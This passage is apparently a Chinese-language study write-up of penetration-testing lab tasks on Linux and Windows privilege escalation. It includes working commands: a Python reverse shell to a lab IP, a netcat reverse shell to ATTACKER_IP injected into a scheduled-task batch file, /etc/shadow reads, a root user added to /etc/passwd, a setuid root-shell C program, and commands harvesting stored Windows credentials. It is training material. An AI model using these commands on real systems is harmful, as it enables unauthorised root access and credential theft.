<p>现在，当启动用户可以使用 sudo 运行的任何程序时，我们可以使用此共享对象文件。在我们的例子中，Apache2、find 或几乎任何我们可以使用 sudo 运行的程序都可以使用。</p>
<p>我们需要通过指定LD_PRELOAD选项来运行程序，如下；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo LD_PRELOAD=/home/user/ldpreload/shell.so find</span><br></pre></td></tr></table></figure>

<p>这将导致生成具有 root 权限的 shell。</p>
<p>打开靶机，<code>sudo -l</code>发现存在find命令可以提权</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240928145626013.png"></p>
<h4 id="Task5-SUID"><a href="#Task5-SUID" class="headerlink" title="Task5 SUID"></a>Task5 SUID</h4><p>许多Linux权限控制依赖于控制用户和文件交互。这是通过权限完成的。到现在为止，您知道文件可以具有读、写和执行权限。这些是在其权限级别内提供给用户的。这会随着 SUID（设备用户标识）和 SGID（设备组标识）而改变。这些允许分别以文件所有者或组所有者的权限级别执行文件。</p>
<p>您会注意到这些文件有一个“s”位设置，显示其特殊权限级别。下面命令将列出设置了 SUID 或 SGID 位的文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -type f -perm -04000 -ls 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240928150146088.png"></p>
<p>可以发现nano命令已经设置为SUID位，我们可以读取<code>/etc/passwd</code>和<code>/etc/shaodw</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nano /etc/passwd</span><br><span class="line">nano /etc/shaodw</span><br></pre></td></tr></table></figure>

<p>然后使用unshadow生成john可破解的文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unshadow passwd.txt shadow.txt &gt; passwords.txt</span><br></pre></td></tr></table></figure>

<p>另一种选择是添加具有 root 权限的新用户。这将帮助我们绕过密码破解的繁琐过程。我们需要我们希望新用户拥有的密码的哈希值。这可以使用 Kali Linux上的 openssl 工具快速完成。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt rev1ve rev1ve</span><br></pre></td></tr></table></figure>

<p>然后，我们将此密码和用户名添加到<code>/etc/passwd</code>文件中，再切换用户即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rev1ve:$1$rev1ve$sQl3WXKUgGAsDB384YvPa/:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>



<p>打开靶机，查看设置了 SUID 位的文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -type f -perm -04000 -ls 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240928160212855.png"></p>
<p>注意到base64命令可以使用，参考GTFOBins</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240928160252609.png"></p>
<p>执行以下命令查看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/bin/base64 /etc/shadow | base64 --decode</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240928160422465.png"></p>
<p>然后使用john暴力破解得到user2的密码</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240928161158193.png"></p>
<h4 id="Task6-Capabilities"><a href="#Task6-Capabilities" class="headerlink" title="Task6 Capabilities"></a>Task6 Capabilities</h4><blockquote>
<p>系统管理员可以用来提高进程或二进制文件的权限级别的另一种方法是“Capabilities”。Capabilities有助于更精细地管理权限。例如，如果SOC分析师需要使用需要启动套接字连接的工具，普通用户将无法做到这一点。如果系统管理员不想授予该用户更高的权限，他们可以更改二进制文件的功能。因此，二进制文件无需更高权限的用户即可完成其任务。功能手册页提供了有关其用法和选项的详细信息。</p>
</blockquote>
<p>我们可以使用<code>getcap</code>工具来列出启用的功能。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002103401328.png"></p>
<p>注：当以非特权用户身份运行时， <code>getcap -r /</code>将生成大量错误，因此最好将错误消息重定向到<code>/dev/null</code>。</p>
<p>通过查阅GTFObins，vim命令可以用来权限提升</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002104251996.png"></p>
<p>打开靶机后ssh连接，查找设置了capabilities可执行文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getcap -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002104547856.png"></p>
<p>利用vim命令失败，继续利用view命令即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">view -c &#x27;:!/bin/sh&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="Task7-Cron定时任务"><a href="#Task7-Cron定时任务" class="headerlink" title="Task7 Cron定时任务"></a>Task7 Cron定时任务</h4><p>Cron 作业用于在特定时间运行脚本或二进制文件。默认情况下，它们以其所有者的权限运行，而不是以当前用户的权限运行。虽然正确配置的 cron 作业本身并不容易受到攻击，但它们在某些情况下可以提供权限升级向量。这个想法很简单；如果有一个以 root 权限运行的计划任务，并且我们可以更改将运行的脚本，那么我们的脚本将以 root 权限运行。</p>
<p>Cron 作业配置存储为 crontab（cron 表），以查看任务下次运行的时间和日期。系统上的每个用户都有自己的 crontab 文件，并且无论是否登录都可以运行特定任务。正如您所期望的，我们的目标是找到由 root 设置的 cron 作业并让它运行我们的脚本（最好是 shell）。</p>
<p>任何用户都可以读取<code>/etc/crontab</code>下保存系统范围 cron 作业的文件，在渗透测试活动中，您会更经常看到每天、每周或每月运行的任务。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002105602886.png"></p>
<p>您可以看到<code>backup.sh</code>脚本被配置为每分钟运行一次。该文件的内容显示了一个简单的脚本，该脚本创建prices.xls 文件的备份。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002105622921.png"></p>
<p>该脚本将使用目标系统上可用的工具来启动反向 shell。<br> 需要注意的两点；</p>
<ol>
<li>命令语法将根据可用工具的不同而有所不同。 （例如<code>nc</code>可能不支持您在其他情况下可能看到的<code>-e</code>选项）</li>
<li>我们应该始终倾向于启动反向 shell，因为我们不想在真正的渗透测试过程中损害系统的完整性。</li>
</ol>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002105807032.png"></p>
<p>我们开启监听器即可收到反向shell</p>
<p>Crontab 始终值得检查，因为它有时会导致轻松的权限升级向量。在不具备一定网络安全成熟度级别的公司中，以下情况并不少见：</p>
<ol>
<li>系统管理员需要定期运行脚本。</li>
<li>他们创建了一个 cron 作业来执行此操作</li>
<li>一段时间后，脚本变得毫无用处，他们将其删除</li>
<li>他们不清理相关的 cron 作业</li>
</ol>
<p>此变更管理问题会导致利用 cron 作业的潜在漏洞。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002105930365.png"></p>
<p>上面的示例显示了类似的情况，antivirus.sh 脚本被删除，但 cron 作业仍然存在。如果未定义脚本的完整路径（就像为 backup.sh 脚本所做的那样），cron 将引用 &#x2F;etc&#x2F;crontab 文件中 PATH  变量下列出的路径。在这种情况下，我们应该能够在用户的主文件夹下创建一个名为“antivirus.sh”的脚本，并且它应该由 cron 作业运行。这样传入的反向 shell 连接具有 root 权限</p>
<p>打开靶机ssh连接，查看用户定义的cron 作业</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002110212836.png"></p>
<p>我们注意到<code>/tmp</code>路径下的test.py文件，进行搜索发现不存在</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002110547035.png"></p>
<p>我们切换到<code>/tmp</code>目录下，创建test.py并写入反向shell（注意要赋予执行权限）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;10.10.34.216&quot;,777));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002125629655.png"></p>
<h4 id="Task8-PATH"><a href="#Task8-PATH" class="headerlink" title="Task8 PATH"></a>Task8 PATH</h4><p>如果您的用户具有写入权限的文件夹位于路径中，您可能会劫持应用程序来运行脚本。 Linux 中的 PATH 是一个环境变量，它告诉操作系统在哪里搜索可执行文件。对于任何未内置到 shell  中或未定义绝对路径的命令，Linux 将开始在 PATH 下定义的文件夹中搜索。 （PATH是我们这里讨论的环境变量，path是文件的位置）。</p>
<p>如果我们在命令行中输入“thm”， Linux将在这些位置查找名为 thm 的可执行文件。下面的场景将使您更好地了解如何利用它来提高我们的特权级别。正如您将看到的，这完全取决于目标系统的现有配置，因此在尝试此操作之前，请确保您可以回答以下问题。</p>
<ol>
<li>$PATH 下有哪些文件夹</li>
<li>您当前的用户是否具有这些文件夹的写入权限？</li>
<li>可以修改$PATH吗？</li>
<li>您可以启动的脚本&#x2F;应用程序是否会受到此漏洞的影响？</li>
</ol>
<p>出于演示目的，我们将使用以下脚本：</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002130704075.png"></p>
<p>该脚本尝试启动一个名为“thm”的系统二进制文件，但该示例可以轻松地用任何二进制文件复制。</p>
<p>我们将其编译为可执行文件并设置 SUID 位。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002130732512.png"></p>
<p>我们的用户现在可以访问设置了 SUID 位的“path”脚本。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002130751683.png"></p>
<p>执行后，“path”将在 PATH 下列出的文件夹中查找名为“thm”的可执行文件。</p>
<p>如果 PATH 下列出了任何可写文件夹，我们可以在该目录下创建一个名为 thm 的二进制文件，并让我们的“path”脚本运行它。设置 SUID 位后，该二进制文件将以 root 权限运行</p>
<p>可以使用以下命令对可写文件夹进行简单搜索。可以使用简单的剪切和排序序列来清理此命令的输出。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -writable 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002130931050.png"></p>
<p>我们在 &#x2F;usr 下看到许多文件夹，因此再次运行可写文件夹搜索以覆盖子文件夹可能会更容易。</p>
<p>另一种选择是使用下面的命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -writable 2&gt;/dev/null | cut -d &quot;/&quot; -f 2,3 | grep -v proc | sort -u</span><br></pre></td></tr></table></figure>

<p>我们添加了“grep -v proc”来消除与运行进程相关的许多结果。不幸的是，&#x2F;usr下的子文件夹不可写</p>
<p>更容易写入的文件夹可能是 &#x2F;tmp。此时，由于 PATH 中不存在 &#x2F;tmp，因此我们需要添加它</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PATH=/tmp:$PATH</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002131055630.png"></p>
<p>此时，路径脚本还将在 &#x2F;tmp 文件夹下查找名为“thm”的可执行文件。我们创建thm文件并写入<code>/bin/bash</code>即可，然后再赋予执行权限</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002131206428.png"></p>
<p>打开靶机ssh连接，查看可写文件夹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -writable 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002131612819.png"></p>
<p>注意到<code>/home/murdoch</code>拥有可写权限，访问发现存在thm.py调用thm二进制文件</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002133051337.png"></p>
<p>不过这里不能直接执行thm.py，是通过具有SUID位的test二进制文件调用的</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002133938265.png"></p>
<p>我们添加下PATH环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PATH=/home/murdoch:$PATH</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002134039488.png"></p>
<p>然后在<code>/home/murdoch</code>下创建thm恶意文件，然后赋予执行权限后，执行test二进制文件即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/bash</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002134200271.png"></p>
<h4 id="Task9-NFS"><a href="#Task9-NFS" class="headerlink" title="Task9 NFS"></a>Task9 NFS</h4><p>权限升级载体不仅限于内部访问。共享文件夹和远程管理界面（例如SSH和 Telnet）还可以帮助您获得目标系统的 root 访问权限。某些情况下还需要使用这两个向量，例如在目标系统上查找 root SSH私钥并通过SSH以 root 权限进行连接，而不是尝试提高当前用户的权限级别。</p>
<p>与 CTF 和考试更相关的另一个载体是配置错误的网络 shell。当存在网络备份系统时，有时可以在渗透测试期间看到此载体。</p>
<p>NFS（网络文件共享）配置保存在 &#x2F;etc&#x2F;exports 文件中。该文件是在 NFS 服务器安装期间创建的，通常可供用户读取。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002140242322.png"></p>
<p>此权限升级载体的关键元素是您在上面看到的“no_root_squash”选项。默认情况下，NFS 会将 root 用户更改为 nfsnobody，并禁止以 root  权限操作任何文件。如果可写共享上存在“no_root_squash”选项，我们可以创建一个设置了 SUID 位的可执行文件并在目标系统上运行它。</p>
<p>我们将首先枚举攻击机器上的可挂载共享。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002140412935.png"></p>
<p>我们将把“no_root_squash”共享之一挂载到我们的攻击机器上并开始构建我们的可执行文件。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002140721797.png"></p>
<p>由于我们可以设置 SUID 位，因此在目标系统上运行 &#x2F;bin&#x2F;bash 的简单可执行文件将完成这项工作。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002140927656.png"></p>
<p>编译代码后，我们将设置 SUID 位。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002140951745.png"></p>
<p>您将在下面看到这两个文件（nfs.c 和 nfs 都存在于目标系统上。我们已经处理了已安装的共享，因此无需传输它们）。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002141038493.png"></p>
<p>请注意，nfs 可执行文件在目标系统上设置了 SUID 位，并以 root 权限运行。</p>
<p>打开靶机，我们先查看靶机的可挂载共享</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002151833194.png"></p>
<p>ssh连接靶机查看</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002151922174.png"></p>
<p>那么选择<code>/tmp</code>挂载到我们的<code>/tmp/hacker</code>下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount -o rw 10.10.144.39:/tmp /tmp/hacker</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002151749512.png"></p>
<p>然后在本地创建nfs.c后编译</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>赋予SUID位，然后在靶机执行即可</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002152334505.png"></p>
<h4 id="Task10-challenge"><a href="#Task10-challenge" class="headerlink" title="Task10 challenge"></a>Task10 challenge</h4><p>ssh登录leonard用户，发现<code>/home</code>目录下存在三个账户</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002153529424.png"></p>
<p>看看有什么SUID位的文件可以利用，发现base64命令</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002153629321.png"></p>
<p>使用base64命令读取下<code>/etc/shadow</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/bin/base64 /etc/shadow | base64 --decode</span><br></pre></td></tr></table></figure>

<p>发现刚好有missy用户的密码，用john爆破得到<code>Password1</code></p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002153743615.png"></p>
<p>ssh登录missy用户，成功拿到flag1</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002154147885.png"></p>
<p>尝试sudo提权，发现有find命令</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002154435253.png"></p>
<p>成功提权，拿到flag2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/find . -exec /bin/sh \; -quit</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002154843132.png"></p>
<h3 id="Windows-权限提升"><a href="#Windows-权限提升" class="headerlink" title="Windows 权限提升"></a>Windows 权限提升</h3><h4 id="Task1-基本概念"><a href="#Task1-基本概念" class="headerlink" title="Task1 基本概念"></a>Task1 基本概念</h4><p>简而言之，权限升级包括使用“用户 A”对主机的给定访问权限，并通过滥用目标系统中的弱点来利用它来获得对“用户 B”的访问权限。虽然我们通常希望“用户 B”拥有管理权限，但在某些情况下，我们可能需要升级到其他非特权帐户，然后才能真正获得管理权限。</p>
<p>获取对不同帐户的访问权限就像在某些粗心用户留下的不安全的文本文件或电子表格中查找凭据一样简单，但情况并非总是如此。根据具体情况，我们可能需要利用以下一些弱点：</p>
<ul>
<li>Windows 服务或计划任务配置错误</li>
<li>分配给我们帐户的权限过多</li>
<li>易受攻击的软件</li>
<li>缺少 Windows 安全补丁</li>
</ul>
<p>在开始讨论实际技术之前，让我们先了解一下 Windows 系统上的不同帐户类型。</p>
<p><strong>Windows 用户</strong></p>
<p>Windows系统主要有两类用户。根据用户的访问级别，我们可以将用户分为以下组之一：</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td><strong>管理员</strong></td>
<td>这些用户拥有最多的权限。他们可以更改任何系统配置参数并访问系统中的任何文件。</td>
</tr>
<tr>
<td><strong>标准用户</strong></td>
<td>这些用户可以访问计算机，但只能执行有限的任务。通常，这些用户无法对系统进行永久或重要的更改，并且仅限于他们的文件。</td>
</tr>
</tbody></table>
<p>任何具有管理权限的用户都将成为<strong>管理员</strong>组的一部分。另一方面，标准用户是<strong>用户</strong>组的一部分。</p>
<p>除此之外，您通常会听说操作系统在权限升级的情况下使用一些特殊的内置帐户：</p>
<table>
<thead>
<tr>
<th><strong>系统&#x2F;本地系统</strong></th>
<th>操作系统用来执行内部任务的帐户。它可以完全访问主机上可用的所有文件和资源，并且具有比管理员更高的权限。</th>
</tr>
</thead>
<tbody><tr>
<td><strong>本地服务</strong></td>
<td>用于以“最低”权限运行 Windows 服务的默认帐户。它将使用网络上的匿名连接。</td>
</tr>
<tr>
<td><strong>网络服务</strong></td>
<td>用于以“最低”权限运行 Windows 服务的默认帐户。它将使用计算机凭据通过网络进行身份验证。</td>
</tr>
</tbody></table>
<p>这些帐户由 Windows 创建和管理，您将无法像其他常规帐户一样使用它们。不过，在某些情况下，您可能会因为利用特定服务而获得他们的特权。</p>
<h4 id="Task2-信息搜集"><a href="#Task2-信息搜集" class="headerlink" title="Task2 信息搜集"></a>Task2 信息搜集</h4><h5 id="无人值守的-Windows-安装"><a href="#无人值守的-Windows-安装" class="headerlink" title="无人值守的 Windows 安装"></a>无人值守的 Windows 安装</h5><p>在大量主机上安装 Windows 时，管理员可以使用 Windows  部署服务，该服务允许通过网络将单个操作系统映像部署到多台主机。此类安装称为无人值守安装，因为它们不需要用户交互。此类安装需要使用管理员帐户来执行初始设置，该设置最终可能存储在计算机中的以下位置：</p>
<ul>
<li>C:\Unattend.xml</li>
<li>C:\Windows\Panther\Unattend.xml</li>
<li>C:\Windows\Panther\Unattend\Unattend.xml</li>
<li>C:\Windows\system32\sysprep.inf</li>
<li>C:\Windows\system32\sysprep\sysprep.xml</li>
</ul>
<p>作为这些文件的一部分，您可能会遇到凭据：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Credentials&gt;</span><br><span class="line">    &lt;Username&gt;Administrator&lt;/Username&gt;</span><br><span class="line">    &lt;Domain&gt;thm.local&lt;/Domain&gt;</span><br><span class="line">    &lt;Password&gt;MyPassword123&lt;/Password&gt;</span><br><span class="line">&lt;/Credentials&gt;</span><br></pre></td></tr></table></figure>



<h5 id="Powershell-历史"><a href="#Powershell-历史" class="headerlink" title="Powershell 历史"></a>Powershell 历史</h5><p>每当用户使用 Powershell 运行命令时，它都会存储到一个文件中，该文件会保留过去的命令。这对于快速重复之前使用过的命令很有用。如果用户直接在 Powershell 命令行中运行包含密码的命令，则稍后可以在<code>cmd.exe</code>提示符下使用以下命令来检索该密码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong>上面的命令只能在 cmd.exe 中运行，因为 Powershell 不会将<code>%userprofile%</code>识别为环境变量。要从 Powershell 读取该文件，您必须将<code>%userprofile%</code>替换为<code>$Env:userprofile</code> 。</p>
<h5 id="保存的-Windows-凭据"><a href="#保存的-Windows-凭据" class="headerlink" title="保存的 Windows 凭据"></a>保存的 Windows 凭据</h5><p>Windows 允许我们使用其他用户的凭据。此功能还提供了将这些凭据保存在系统上的选项。下面的命令将列出保存的凭据：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmdkey /list</span><br></pre></td></tr></table></figure>

<p>虽然您看不到实际的密码，但如果您发现任何值得尝试的凭据，您可以将它们与<code>runas</code>命令和<code>/savecred</code>选项一起使用，如下所示。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">runas /savecred /user:admin cmd.exe</span><br></pre></td></tr></table></figure>



<h5 id="IIS-配置"><a href="#IIS-配置" class="headerlink" title="IIS 配置"></a>IIS 配置</h5><p>Internet 信息服务 (IIS) 是 Windows 安装上的默认 Web 服务器。 IIS 上网站的配置存储在名为<code>web.config</code>的文件中，并且可以存储数据库的密码或配置的身份验证机制。根据安装的 IIS 版本，我们可以在以下位置之一找到 web.config：</p>
<ul>
<li>C:\inetpub\wwwroot\web.config</li>
<li>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config</li>
</ul>
<p>这是在文件上查找数据库连接字符串的快速方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString</span><br></pre></td></tr></table></figure>



<h5 id="从软件检索凭证：PuTTY"><a href="#从软件检索凭证：PuTTY" class="headerlink" title="从软件检索凭证：PuTTY"></a>从软件检索凭证：PuTTY</h5><p>PuTTY 是 Windows 系统上常见的 SSH 客户端。用户不必每次都指定连接参数，而是可以存储会话，其中可以存储 IP、用户和其他配置以供以后使用。虽然 PuTTY 不允许用户存储其SSH密码，但它将存储包含明文身份验证凭据的代理配置。</p>
<p>要检索存储的代理凭据，您可以使用以下命令在以下注册表项下搜索 ProxyPassword：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f &quot;Proxy&quot; /s</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong> Simon Tatham 是 PuTTY 的创建者（他的名字是路径的一部分），而不是我们要检索密码的用户名。运行上述命令后，存储的代理用户名也应该可见。</p>
<p>正如 putty 存储凭据一样，任何存储密码的软件，包括浏览器、电子邮件客户端、 FTP客户端、 SSH客户端、VNC 软件等，都将有方法恢复用户保存的任何密码。</p>
<p>打开靶机，RDP远程连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xfreerdp /v:10.10.103.83 /u:thm-unpriv /p:Password321</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241004173401232.png"></p>
<p>找到存储在powershell的密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241004174005931.png"></p>
<p>​	继续找到与 IIS 关联的 web.config 文件中的密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241004174301641.png"></p>
<p>查看下保存的登录凭据，配合<code>/savecred</code>参数直接无密码登录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmdkey /list</span><br><span class="line">runas /savecred /user:WPRIVESC1\mike.katz cmd.exe</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241004174549976.png"></p>
<p>查看存储的代理凭据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f &quot;Proxy&quot; /s</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241004175358195.png"></p>
<h4 id="Task3-计划任务"><a href="#Task3-计划任务" class="headerlink" title="Task3 计划任务"></a>Task3 计划任务</h4><p>查看目标系统上的计划任务，您可能会看到计划任务丢失了其二进制文件或正在使用您可以修改的二进制文件。</p>
<p>可以使用不带任何选项的<code>schtasks</code>命令从命令行列出计划任务。要检索有关任何服务的详细信息，您可以使用如下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; schtasks /query /tn vulntask /fo list /v</span><br><span class="line">Folder: \</span><br><span class="line">HostName:                             THM-PC1</span><br><span class="line">TaskName:                             \vulntask</span><br><span class="line">Task To Run:                          C:\tasks\schtask.bat</span><br><span class="line">Run As User:                          taskusr1</span><br></pre></td></tr></table></figure>

<p>您将获得有关该任务的大量信息，但对我们来说重要的是“要运行的任务”参数，该参数指示计划任务执行的内容，以及“以用户身份运行”参数，该参数显示将使用的用户执行任务。</p>
<p>如果我们当前的用户可以修改或覆盖“要运行的任务”可执行文件，我们就可以控制 taskusr1 用户执行的内容，从而实现简单的权限提升。要检查可执行文件的文件权限，我们使用<code>icacls</code> ：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; icacls c:\tasks\schtask.bat</span><br><span class="line">c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)</span><br><span class="line">                    BUILTIN\Administrators:(I)(F)</span><br><span class="line">                    BUILTIN\Users:(I)(F)</span><br><span class="line">        </span><br></pre></td></tr></table></figure>

<p>从结果中可以看出， <strong>BUILTIN\Users</strong>组对任务的二进制文件具有完全访问权限 (F)。这意味着我们可以修改 .bat 文件并插入我们喜欢的任何有效负载。为了您的方便， <code>nc64.exe</code>可以在<code>C:\tools</code>中找到。让我们更改 bat 文件以生成反向 shell：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 &gt; C:\tasks\schtask.bat        </span><br></pre></td></tr></table></figure>

<p>然后，我们在攻击者机器上启动一个侦听器，该侦听器位于我们在反向 shell 上指示的同一端口上：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>

<p>下次运行计划任务时，您应该会收到具有taskusr1权限的反向shell。虽然您可能无法在实际场景中启动任务，而必须等待计划任务触发，但我们为您的用户提供了手动启动任务的权限，以节省您的时间。我们可以使用以下命令运行该任务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks /run /tn vulntask</span><br></pre></td></tr></table></figure>

